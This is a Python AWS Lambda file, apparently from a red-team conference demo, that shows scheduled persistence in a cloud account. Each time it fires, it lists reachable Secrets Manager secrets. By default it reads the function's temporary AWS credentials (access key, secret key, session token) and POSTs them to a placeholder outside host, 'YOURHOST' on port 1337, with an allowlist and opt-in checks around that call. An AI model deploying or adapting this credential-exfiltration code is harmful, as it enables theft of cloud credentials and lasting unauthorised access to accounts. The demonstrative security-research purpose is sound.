"""
RTV demo persistence Lambda.

Fires on an EventBridge schedule. Demonstrates that a compromised build role
can plant durable, self-refreshing access into an AWS account using only
native services.

CloudWatch remains the primary proof. When the presenter explicitly opts in,
the function sends the full AWS temporary credentials (access key ID, secret
access key, session token) to the fixed demonstration endpoint.
"""

import datetime
import json
import os
import ssl
import urllib.parse
import urllib.request

import boto3


ALLOWED_CALLBACK = ("https", "YOURHOST", 1337)


def send_credentials_callback(callback_url, session_label, invocation_id, fired_at, credentials=None):
    if not callback_url:
        return "disabled"

    parsed = urllib.parse.urlparse(callback_url)
    if (
        parsed.scheme,
        parsed.hostname,
        parsed.port,
    ) != ALLOWED_CALLBACK or parsed.username or parsed.password or parsed.query or parsed.fragment:
        raise ValueError("callback URL is not the fixed safe demonstration endpoint")

    proof = {
        "kind": "rtv-credential-capture",
        "fired_at": fired_at,
        "invocation_id": invocation_id,
        "session_label": session_label,
    }
    if credentials:
        proof.update(credentials)
    context = ssl.create_default_context(cafile="/var/task/proof-listener-ca.pem")
    request = urllib.request.Request(
        callback_url,
        data=json.dumps(proof).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=3, context=context) as response:
        return "sent" if 200 <= response.status < 300 else f"http-{response.status}"


def build_credentials(identity_arn):
    role_label = identity_arn.rsplit(":assumed-role/", 1)[-1].split("/", 1)[0]
    return {
        "access_key_id": os.environ.get("AWS_ACCESS_KEY_ID", ""),
        "secret_access_key": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        "session_token": os.environ.get("AWS_SESSION_TOKEN", ""),
        "role_label": role_label,
    }


def lambda_handler(event, context):
    sts = boto3.client("sts")
    sm = boto3.client("secretsmanager")

    identity = sts.get_caller_identity()

    secrets = sm.list_secrets(MaxResults=20)
    reachable = [s["Name"] for s in secrets.get("SecretList", [])]

    fired_at = datetime.datetime.now(datetime.timezone.utc).isoformat()
    invocation_id = context.aws_request_id
    callback_status = "disabled"
    detail_mode = os.environ.get("PROOF_DETAIL_MODE", "identity")
    if detail_mode not in {"basic", "identity"}:
        raise ValueError("PROOF_DETAIL_MODE must be basic or identity")
    credentials = build_credentials(identity["Arn"]) if detail_mode == "identity" else None
    try:
        callback_status = send_credentials_callback(
            os.environ.get("PROOF_CALLBACK_URL", ""),
            os.environ.get("PROOF_SESSION_LABEL", "rtv-speaker-demo"),
            invocation_id,
            fired_at,
            credentials,
        )
    except Exception as error:
        callback_status = f"failed-{type(error).__name__}"

    payload = {
        "fired_at": fired_at,
        "running_as": identity["Arn"],
        "account": identity["Account"],
        "secrets_reachable": reachable,
        "callback_status": callback_status,
        "invocation_id": invocation_id,
    }

    print(json.dumps(payload, indent=2))
    return {"statusCode": 200, "body": json.dumps(payload)}
